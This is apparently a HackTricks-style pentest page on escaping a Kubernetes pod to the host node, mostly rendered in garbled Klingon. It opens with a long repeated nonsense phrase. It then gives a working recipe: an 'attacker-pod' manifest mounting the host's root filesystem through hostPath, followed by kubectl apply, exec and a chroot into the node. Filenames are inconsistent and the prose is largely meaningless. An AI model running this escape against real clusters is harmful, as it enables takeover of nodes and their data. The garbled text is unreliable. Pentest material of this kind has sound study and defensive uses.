vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay'
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> **ghItlhvam**: vaj pod yInobDaqDaq, 'ej vaj labels yInobDaqDaq 'e' vItlhutlh.
>
> `k get nodes --show-labels`
>
> jatlhlaHbe', kubernetes.io/hostname 'ej node-role.kubernetes.io/master labels vItlhutlh.
>
> [reference]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

ngoD 'attack.yaml' file vItlhutlh.
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[original yaml source](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

DaH jImej pod yIlo'be'.
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
DaH jImej pod vItlhutlh.
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
'ej pagh finally chroot into the node's system
```bash
chroot /root /bin/bash
```
Information obtained from: [Kubernetes Namespace Breakout using Insecure Host Path Volume ‚Äî Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube ‚Äì Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## References

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
